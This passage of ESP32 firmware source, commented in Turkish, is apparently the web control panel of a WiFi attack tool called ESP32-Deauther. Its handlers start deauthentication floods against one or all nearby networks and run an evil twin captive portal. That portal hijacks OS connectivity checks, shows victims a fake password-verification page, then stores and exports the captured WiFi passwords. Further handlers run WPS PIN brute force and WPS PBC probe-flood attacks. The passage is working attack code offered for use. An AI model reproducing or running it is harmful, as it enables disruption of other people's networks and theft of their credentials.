  if (!evil_twin_active) { redirect_root(); return; }
  et_start_wps_pbc();
  redirect_root();
}

// /wps_pbc_stop → WPS PBC durdur
static void handle_wps_pbc_stop() {
  et_stop_wps_pbc();
  redirect_root();
}

// ─── Submit: test durumu — main.cpp loop'tan erişilir (extern) ───────────────
bool   et_test_pending   = false;
bool   et_result_ready   = false;
bool   et_result_correct = false;
String et_tested_ssid     = "";
String et_tested_password = "";

// ─── WPS ertelenmiş işlemler — main loop'tan çalıştırılır ────────────────────
// Handler HTTP yanıtını hemen gönderir; WiFi'yi bozan iş main loop'ta yapılır.
// Böylece redirect kullanıcıya ulaşır, AP drop olmadan saldırı başlar.
bool wps_scan_pending        = false;
bool wps_attack_pending      = false;
int  wps_attack_pending_idx  = 0;

// WPS PBC ertelenmiş işlemler
bool wps_pbc_monitor_pending = false;
bool wps_pbc_flood_pending   = false;
int  wps_pbc_pending_idx     = 0;

// Evil Twin ertelenmiş başlatma
bool et_start_pending      = false;
int  et_start_wifi_number  = -1;

// Ağ listesi yeniden tarama
bool rescan_pending = false;

static void handle_submit() {
  if (!evil_twin_active) { redirect_root(); return; }

  String password = server.arg("password");
  password.trim();

  if (password.length() < 8) {
    server.sendHeader("Location", "/portal_wrong");
    server.send(302);
    return;
  }

  // Durumu ayarla — main loop testi alır
  et_test_pending   = true;
  et_result_ready   = false;
  et_result_correct = false;
  et_tested_ssid    = evil_twin_ssid;
  et_tested_password = password;

  // Handler HEMEN döner — TCP flush garantisi için blocking YOK
  // Tarayıcı "test ediliyor" sayfasını alır, 12s sonra /test_result'a gider
  server.send(200, "text/html", F(
    "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<meta http-equiv='refresh' content='12; url=/test_result'>"
    "<title>Test Ediliyor...</title>"
    "<style>"
    "body{font-family:'Segoe UI',sans-serif;background:#0d1117;"
    "display:flex;align-items:center;justify-content:center;height:100vh;margin:0}"
    ".box{background:#161b22;border:1px solid #30363d;border-radius:14px;"
    "padding:36px 28px;max-width:320px;text-align:center}"
    ".spin{width:44px;height:44px;border:4px solid #30363d;"
    "border-top-color:#58a6ff;border-radius:50%;animation:s 1s linear infinite;"
    "margin:0 auto 20px}"
    "@keyframes s{to{transform:rotate(360deg)}}"
    "h2{color:#f0f6fc;font-size:1.1em;margin-bottom:8px}"
    "p{color:#8b949e;font-size:.82em;line-height:1.5}"
    "</style></head><body>"
    "<div class='box'><div class='spin'></div>"
    "<h2>Sifre Dogrulaniyor</h2>"
    "<p>Gercek aga baglaniliyor,<br>lutfen bekleyin...</p>"
    "</div></body></html>"));
  // ← handler burada döner; TCP flush olur; tarayıcı sayfayı görür
}

static void handle_test_result() {
  if (!et_result_ready) {
    // Test henuz bitmedi — 3 saniye sonra tekrar kontrol et
    String html = F("<!DOCTYPE html><html><head><meta charset='UTF-8'>"
      "<meta name='viewport' content='width=device-width,initial-scale=1'>"
      "<meta http-equiv='refresh' content='3; url=/test_result'>"
      "<title>Bekleniyor...</title>"
      "<style>"
      "body{font-family:'Segoe UI',sans-serif;background:#0d1117;"
      "display:flex;align-items:center;justify-content:center;height:100vh;margin:0}"
      ".box{background:#161b22;border:1px solid #30363d;border-radius:14px;"
      "padding:36px 28px;max-width:320px;text-align:center}"
      ".spin{width:44px;height:44px;border:4px solid #30363d;"
      "border-top-color:#58a6ff;border-radius:50%;animation:s 1s linear infinite;margin:0 auto 20px}"
      "@keyframes s{to{transform:rotate(360deg)}}"
      "h2{color:#f0f6fc;font-size:1.1em;margin-bottom:8px}"
      "p{color:#8b949e;font-size:.82em}"
      "</style></head><body>"
      "<div class='box'><div class='spin'></div>"
      "<h2>Test Devam Ediyor</h2>"
      "<p>Lutfen bekleyin...</p>"
      "</div></body></html>");
    server.send(200, "text/html", html);
    return;
  }

  if (et_result_correct) {
    String html = F("<!DOCTYPE html><html><head><meta charset='UTF-8'>"
      "<meta name='viewport' content='width=device-width,initial-scale=1'>"
      "<title>Baglandi</title>"
      "<style>"
      "body{font-family:'Segoe UI',sans-serif;background:#0d1117;"
      "display:flex;align-items:center;justify-content:center;height:100vh;margin:0}"
      ".box{background:#0d2818;border:1px solid #3fb950;border-radius:14px;"
      "padding:36px 28px;max-width:320px;text-align:center}"
      "h2{color:#3fb950;margin-bottom:10px;font-size:1.2em}"
      "p{color:#8b949e;font-size:.85em;line-height:1.5}"
      "</style></head><body>"
      "<div class='box'>&#9989;"
      "<h2>Baglanti Basarili!</h2>"
      "<p>Ag kimlik bilgileri dogrulandi.<br>Baglaniliyor...</p>"
      "</div></body></html>");
    server.send(200, "text/html", html);
  } else {
    server.sendHeader("Location", "/portal_wrong");
    server.send(302);
  }
}

// Captive portal detection — tüm OS'leri yakala
static void handle_captive_redirect() {
  if (evil_twin_active) {
    server.sendHeader("Location", "http://192.168.4.1/portal");
    server.send(302);
  } else {
    redirect_root();
  }
}

// Android captive portal check (204 bekleniyor, biz redirect yapıyoruz)
static void handle_generate_204() {
  if (evil_twin_active) {
    server.sendHeader("Location", "http://192.168.4.1/portal");
    server.send(302);
  } else {
    server.send(204);
  }
}

// ─── Bilinmeyen URL — evrensel captive portal yakalayıcı ────────────────────
// DNS tüm domainleri 192.168.4.1'e yönlendirir; buraya gelen her istek
// (kayıtlı olmayan path) captive portal'a yönlendirilir.
// Evil twin aktif değilse yönetim paneline yönlendirir.
static void handle_not_found() {
  if (evil_twin_active) {
    server.sendHeader("Location", "http://192.168.4.1/portal");
    server.send(302);
  } else {
    redirect_root();
  }
}

// ─── Deauth / Stop handler'lar ────────────────────────────────────────────────

static void handle_deauth() {
  int wifi_number = server.arg("net_num").toInt();
  uint16_t reason = server.arg("reason").toInt();

  String result;
  if (wifi_number < num_networks) {
    start_deauth(wifi_number, DEAUTH_TYPE_SINGLE, reason);
    result = "<div class='alert-ok'>&#9889; Deauth basladi: <b>" + WiFi.SSID(wifi_number) +
             "</b> &mdash; Neden: " + String(reason) + "</div>";
  } else {
    result = F("<div class='alert-err'>&#10060; Gecersiz ag numarasi. Once tarayin.</div>");
  }

  String html = F("<!DOCTYPE html><html><head><meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Sonuc</title><style>");
  html += FPSTR(CSS);
  html += F("</style></head><body><div style='max-width:500px;margin:50px auto'><div class='card'>");
  html += result;
  html += F("<hr><a href='/' style='color:#58a6ff;font-size:.9em'>&#8592; Ana Sayfa</a>"
            "</div></div></body></html>");
  server.send(200, "text/html", html);
}

static void handle_deauth_all() {
  uint16_t reason = server.arg("reason").toInt();

  String html = F("<!DOCTYPE html><html><head><meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Tum Aglar</title><style>");
  html += FPSTR(CSS);
  html += F("</style></head><body><div style='max-width:500px;margin:50px auto'><div class='card'>"
    "<div class='alert-err'>&#128165; Tum aglara saldiri basladi! Durdurmak icin ESP32 resetleyin.</div>"
    "</div></div></body></html>");
  server.send(200, "text/html", html);
  server.stop();
  start_deauth(0, DEAUTH_TYPE_ALL, reason);
}

static void handle_rescan() {
  // Blocking scan HTTP handler içinde yapılmaz — redirect gönder, tarama main loop'ta
  rescan_pending = true;
  redirect_root();
}

void web_interface_do_rescan() {
  num_networks = WiFi.scanNetworks();
}

static void handle_stop() {
  stop_deauth();
  redirect_root();
}

static void handle_evil_twin() {
  int wifi_number = server.arg("net_num").toInt();
  if (wifi_number < num_networks) {
    if (WiFi.encryptionType(wifi_number) == WIFI_AUTH_OPEN) {
      String html = F("<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Uyari</title><style>");
      html += FPSTR(CSS);
      html += F("</style></head><body><div style='max-width:500px;margin:50px auto'><div class='card'>"
        "<div class='alert-err'>&#9888; Bu ag sifresiz (OPEN). Evil Twin saldirisina gerek yok, sifre yakalanamaz.</div>"
        "<hr><a href='/' style='color:#58a6ff;font-size:.9em'>&#8592; Ana Sayfa</a>"
        "</div></div></body></html>");
      server.send(200, "text/html", html);
      return;
    }
    // Önce redirect gönder — AP kurulumu main loop'ta yapılır (kullanıcı anında yanıt alır)
    et_start_pending     = true;
    et_start_wifi_number = wifi_number;
    server.sendHeader("Location", "/");
    server.send(302);
  } else {
    String html = F("<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Hata</title><style>");
    html += FPSTR(CSS);
    html += F("</style></head><body><div style='max-width:500px;margin:50px auto'><div class='card'>"
      "<div class='alert-err'>&#10060; Gecersiz ag numarasi. Once aglari tarayin.</div>"
      "<hr><a href='/' style='color:#58a6ff;font-size:.9em'>&#8592; Ana Sayfa</a>"
      "</div></div></body></html>");
    server.send(200, "text/html", html);
  }
}

static void handle_stop_evil_twin() {
  stop_evil_twin();
  redirect_root();
}

static void handle_delete_pw() {
  int idx = server.arg("idx").toInt();
  passwords_delete(idx);
  redirect_root();
}

static void handle_clear_pw() {
  passwords_clear_all();
  redirect_root();
}

// ─── WPS Gerçek Zamanlı Durum (AJAX JSON) ────────────────────────────────────
static void handle_wps_status() {
  char macStr[20];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
    wps_current_mac[0], wps_current_mac[1], wps_current_mac[2],
    wps_current_mac[3], wps_current_mac[4], wps_current_mac[5]);

  const char *stateStr = "idle";
  switch (wps_attack_state) {
    case WPS_ATTACKING:   stateStr = "attacking";  break;
    case WPS_LOCKED_OUT:  stateStr = "locked";     break;
    case WPS_SUCCESS:     stateStr = "success";    break;
    case WPS_EXHAUSTED:   stateStr = "exhausted";  break;
    case WPS_STOPPED:     stateStr = "stopped";    break;
    case WPS_SCANNING:    stateStr = "scanning";   break;
    default:              stateStr = "idle";       break;
  }

  String json = "{";
  json += "\"state\":\"" + String(stateStr) + "\",";
  json += "\"attempt\":" + String(wps_attempt) + ",";
  json += "\"total\":" + String(wps_total) + ",";
  json += "\"pin\":\"" + String(wps_current_pin) + "\",";
  json += "\"vendor\":\"" + String(wps_vendor_name) + "\",";
  json += "\"mac\":\"" + String(macStr) + "\",";
  json += "\"lockout\":" + String(wps_lockout_count) + ",";
  json += "\"found_pin\":\"" + String(wps_found_pin) + "\",";
  json += "\"found_ssid\":\"" + String(wps_found_ssid) + "\",";
  json += "\"found_pass\":\"" + String(wps_found_pass) + "\"";
  json += "}";

  server.sendHeader("Cache-Control", "no-cache");
  server.send(200, "application/json", json);
}

// ─── WPS PBC Saldırısı Handler'ları ──────────────────────────────────────────

// JSON durum endpoint — JS polling için
static void handle_wps_pbc_attack_status() {
  String state_str;
  switch (wps_pbc_attack_state) {
    case WPS_PBC_MONITORING: state_str = "monitoring"; break;
    case WPS_PBC_CONNECTING: state_str = "connecting"; break;
    case WPS_PBC_SUCCESS:    state_str = "success";    break;
    case WPS_PBC_FAILED:     state_str = "failed";     break;
    default:                 state_str = "idle";        break;
  }
  String json = "{\"state\":\"" + state_str + "\""
              + ",\"probes\":" + String(wps_pbc_probes_sent)
              + ",\"ssid\":\""  + String(wps_pbc_found_ssid) + "\""
              + ",\"pass\":\""  + String(wps_pbc_found_pass) + "\""
              + "}";
  server.send(200, "application/json", json);
}

// Hedef AP'yi beacon izleyerek PBC modunu bekle + otomatik bağlan
static void handle_wps_pbc_monitor_start() {
  if (evil_twin_active)                   { redirect_root(); return; }
  if (wps_attack_state == WPS_ATTACKING)  { redirect_root(); return; }
  if (wps_pbc_attack_state != WPS_PBC_IDLE &&
      wps_pbc_attack_state != WPS_PBC_FAILED &&
      wps_pbc_attack_state != WPS_PBC_SUCCESS) { redirect_root(); return; }

  wps_pbc_pending_idx     = server.arg("target_idx").toInt();
  wps_pbc_monitor_pending = true;
  redirect_root();
}

// Eski AP'lere karşı PBC probe flood — main loop'ta çalışır
static void handle_wps_pbc_flood_start() {
  if (evil_twin_active)                   { redirect_root(); return; }
  if (wps_attack_state == WPS_ATTACKING)  { redirect_root(); return; }
  if (wps_pbc_attack_state == WPS_PBC_MONITORING ||
      wps_pbc_attack_state == WPS_PBC_CONNECTING)  { redirect_root(); return; }

  wps_pbc_pending_idx   = server.arg("target_idx").toInt();
  wps_pbc_flood_pending = true;
  redirect_root();
}

// PBC saldırısını durdur / temizle
static void handle_wps_pbc_attack_stop() {
  wps_pbc_stop();
  redirect_root();
}

// ─── WPS PIN Saldırısı Handler'ları ──────────────────────────────────────────

static void handle_wps_scan() {
  if (evil_twin_active) { redirect_root(); return; }
  if (wps_attack_state == WPS_ATTACKING) { redirect_root(); return; }
  // WiFi.scanNetworks() AP'yi kısa süre drop eder — önce redirect gönder,
  // tarama main loop'ta yapılır.
  wps_scan_pending = true;
  redirect_root();
}

static void handle_wps_attack() {
  if (evil_twin_active) { redirect_root(); return; }
  if (wps_attack_state == WPS_ATTACKING) { redirect_root(); return; }
  // wps_start_attack() 5s bloke eder + WiFi.mode(APSTA) AP'yi drop eder.
  // Önce redirect gönder, saldırı main loop'ta başlatılır.
  wps_attack_pending_idx = server.arg("target_idx").toInt();
  wps_attack_pending     = true;
  redirect_root();
}

static void handle_wps_stop() {
  wps_stop();   // AP restore wps_stop() içinde yapılıyor
  redirect_root();
}

static void handle_export_pw() {
  int count = passwords_count();
  String txt = "ESP32-Deauther - Yakalanan Sifreler\n";
  txt += "====================================\n";
  if (count == 0) {
    txt += "(Henuz kayitli sifre yok)\n";
  } else {
    for (int i = 0; i < count; i++) {
      SavedPassword sp = passwords_get(i);
      txt += String(i + 1) + ". SSID: " + sp.ssid + " | Sifre: " + sp.password + "\n";
    }
  }
  server.sendHeader("Content-Disposition", "attachment; filename=sifreler.txt");
  server.send(200, "text/plain; charset=utf-8", txt);
}

// ─── Başlatma ─────────────────────────────────────────────────────────────────

void start_web_interface() {
  // Yönetim sayfaları
  server.on("/",               HTTP_GET,  handle_root);
  server.on("/rescan",         HTTP_POST, handle_rescan);
  server.on("/deauth",         HTTP_POST, handle_deauth);
  server.on("/deauth_all",     HTTP_POST, handle_deauth_all);
  server.on("/stop",           HTTP_POST, handle_stop);
  server.on("/evil_twin",      HTTP_POST, handle_evil_twin);
  server.on("/stop_evil_twin", HTTP_POST, handle_stop_evil_twin);
  server.on("/delete_pw",      HTTP_POST, handle_delete_pw);
  server.on("/clear_pw",       HTTP_POST, handle_clear_pw);
  server.on("/export_pw",      HTTP_GET,  handle_export_pw);

  // WPS PIN brute force
  server.on("/wps_scan",   HTTP_POST, handle_wps_scan);
  server.on("/wps_attack", HTTP_POST, handle_wps_attack);
  server.on("/wps_stop",   HTTP_POST, handle_wps_stop);
  server.on("/wps_status", HTTP_GET,  handle_wps_status);

  // Captive portal — kurban sayfaları
  server.on("/portal",         HTTP_GET,  handle_portal);
  server.on("/portal_wrong",   HTTP_GET,  handle_portal_wrong);
  server.on("/portal_manual",  HTTP_GET,  handle_portal_manual);
  server.on("/submit",         HTTP_POST, handle_submit);
  server.on("/test_result",    HTTP_GET,  handle_test_result);

  // WPS PBC saldırısı — ana yönetim paneli (buton modu, non-blocking)
  server.on("/wps_pbc_monitor_start",  HTTP_POST, handle_wps_pbc_monitor_start);
  server.on("/wps_pbc_flood_start",    HTTP_POST, handle_wps_pbc_flood_start);
  server.on("/wps_pbc_attack_stop",    HTTP_POST, handle_wps_pbc_attack_stop);
  server.on("/wps_pbc_status",         HTTP_GET,  handle_wps_pbc_attack_status);

  // Evil Twin captive portal — WPS PBC yardımcı saldırısı
  server.on("/wps_pbc_start",          HTTP_POST, handle_wps_pbc_start);
  server.on("/wps_pbc_stop",           HTTP_POST, handle_wps_pbc_stop);
  server.on("/et_wps_pbc_status",      HTTP_GET,  handle_et_wps_pbc_status);

  // OS captive portal detection URL'leri
  // Android
  server.on("/generate_204",             handle_generate_204);
  server.on("/gen_204",                  handle_generate_204);
  server.on("/connectcheck.html",        handle_captive_redirect);  // eski Android
  server.on("/204",                      handle_generate_204);
  // iOS / macOS
  server.on("/hotspot-detect.html",      handle_captive_redirect);
  server.on("/library/test/success.html",handle_captive_redirect);  // eski iOS
  server.on("/success.html",             handle_captive_redirect);
  // Windows
  server.on("/ncsi.txt",                 handle_captive_redirect);
  server.on("/connecttest.txt",          handle_captive_redirect);
  server.on("/redirect",                 handle_captive_redirect);
  server.on("/check_network_status.txt", handle_captive_redirect);
  // Firefox
  server.on("/canonical.html",           handle_captive_redirect);
  server.on("/success.txt",              handle_captive_redirect);
  // Kindle / diğer
  server.on("/kindle-wifi/wifiredirect.html", handle_captive_redirect);
  server.on("/wpad.dat",                 handle_captive_redirect);

  // Kayıtlı olmayan TÜM URL'ler — evrensel yakalayıcı (en önemli satır)
  server.onNotFound(handle_not_found);

  // User-Agent başlığını topla — portal OS tespiti için
  static const char *hdrs[] = {"User-Agent"};
  server.collectHeaders(hdrs, 1);

  server.begin();
}

void web_interface_handle_client() {
  server.handleClient();
}
